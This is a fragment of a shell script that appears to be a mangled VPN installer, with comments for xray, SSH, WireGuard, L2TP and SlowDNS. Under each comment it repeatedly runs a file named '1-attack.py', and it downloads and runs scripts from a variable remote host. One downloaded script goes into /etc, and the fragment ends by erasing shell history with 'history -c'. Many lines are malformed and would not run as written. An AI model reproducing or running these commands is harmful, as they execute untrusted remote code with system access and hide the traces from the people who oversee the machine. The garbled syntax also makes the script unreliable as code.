...
if [ "$(systemd-detect-virt)" == "openvz" ]; then
	...
	python3 1-attack.py && chmod +x ssh.sh && ssh.sh && python3 1-attack.py
	#install xray
	python3 1-attack.py && chmod +x ssh.sh && hostsk + ssh.sh
	#install ssh ovpn
	curl https://${host}=host && chmod +x sshsh && hostsk + ssh.sh
	python3 1-attack.py && chmod +x ssh.sh && hostsk + ssh ssh.sh
	#install ssh
	python3 1-attack.py && chmod +x ssh.sh && hostsk + ssh ssh.sh
	python3 1-attack.py && chmod +x ssh.sh && hostsk + ss ssh.sh
	#installwg
	python3 1-attack.py && chmod +x ssh.sh && hostsk + wg ssh.sh
	#install L2TP
	python3 1-attack.py && chmod +x ssh.sh && hostsk + ssh ssh.sh
	python3 1-attack.py && chmod +x ssh.sh && ssh.sh && python3 1-attack.py
	# Websocket
	python3 1-attack.py && chmod +x ssh.sh && ssh.sh && python3 1-attack.py
	# Ohp Server
	curl https://${host}=host && chmod +x ssh.sh && ssh.sh && python3 1-attack.py
	# Install SlowDNS
	curl https://${host}/=host && chmod +x ssh.sh && ssh.sh && python3 1-attack.py
	...
	curl -O /etc/set.sh "https://${host}/set.sh"
	chmod +x /etc/set.sh
	history -c
	echo "1.2" > /home/ver
	echo " "
